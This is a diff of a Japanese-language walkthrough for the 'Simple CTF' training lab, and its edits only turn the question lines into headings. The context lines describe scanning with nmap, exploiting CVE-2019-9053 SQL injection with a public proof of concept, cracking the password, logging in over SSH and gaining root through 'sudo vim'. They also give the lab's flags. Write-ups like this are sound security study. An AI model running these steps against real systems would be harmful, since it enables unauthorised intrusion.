@@ -1,6 +1,6 @@
 #以下はsimple ctfを解くときの軌跡を記録する
 
-**1　How many services are running under port 1000?**  
+## **1　How many services are running under port 1000?**  
   ・ポート番号を調べるため、  
   nmap -sV IP　を試行。（実務を想定し、常にバージョン調査まで行うことを意識する）  
 <details>
@@ -20,10 +20,10 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 </details>
 
 ⇒上記結果から1000以下のポートの数を”2”と回答  
-2 **What is running on the higher port?**  
+## 2 **What is running on the higher port?**  
 ⇒上記結果から”ssh”と回答  
 
-3 **What's the CVE you're using against the application?**  
+## 3 **What's the CVE you're using against the application?**  
 <ins>上記結果から調査順を1.ftp、2.http、3.sshとする。</ins>  
 ftp IP ユーザ名をAnonymousで調査  
 　⇒つながったがlsの結果が返ってこなかった。  
@@ -115,11 +115,11 @@ Shellcodes: No Results
 　WebからCVEを特定する  
  　その結果**CVE-2019-9053**と判明したため、回答。
 
-4 **What's the password?**
+## 4 **What's the password?**
 
 ⇒HTTP調査の結果より、脆弱性の種類は SQLI (SQL Injection) と判明した。
 
-5 **What's the password?**
+## 5 **What's the password?**
 
 ⇒脆弱性とPOCが判明したため、実際に動かしていく  
 　が、この46635.pyファイルが2.x用であったため、これを3.x用にしなければならない
@@ -266,17 +266,17 @@ python2 46635.py -u http://10.49.141.85/simple --crack -w /usr/share/wordlists/r
 上記結果より、secretと回答
 
 
-6 **Where can you login with the details obtained?**  
+## 6 **Where can you login with the details obtained?**  
 問１で調査したnmap結果からsshと回答  
 ssh -p 2222 mitch@IP (ポート指定しないとつながらない)　
 ※ポート指定しないとデフォルトの22につなごうとしてしまう
 
-7 **What's the user flag?**
+## 7 **What's the user flag?**
 問6で侵入後、lsした際にuser.txtがあったため、それをcatした。
 $ cat user.txt
 G00d j0b, keep up!
 
-8 **Is there any other user in the home directory? What's its name?**  
+## 8 **Is there any other user in the home directory? What's its name?**  
 $ cd /home
 $ ls -l
 total 8
@@ -284,18 +284,18 @@ drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
 drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath  
 上記コマンド結果よりsunbathと回答。
 
-9 **What can you leverage to spawn a privileged shell?**
+## 9 **What can you leverage to spawn a privileged shell?**
 権限昇格するために初めにsudo -l を実施  
 結果  
 (root) NOPASSWD: /usr/bin/vim  
 vimがroot権限で動かせれることを確認できたため、vimと回答
 
-10 **What's the root flag?**
+## 10 **What's the root flag?**
 sudo vimでエディタが開いた後に:!sh
 もしくは　sudo vim -c ':!sh'
 をすることでroot昇格
 
-11 **まとめ**
+## 11 **まとめ**
 今回のCTFで発見した脆弱性は以下の通り
 ・FTPポートが開いていたこと
 ・FTPの設定ファイルのユーザ名がAnonymousであったこと（デフォルト値から変更していない）
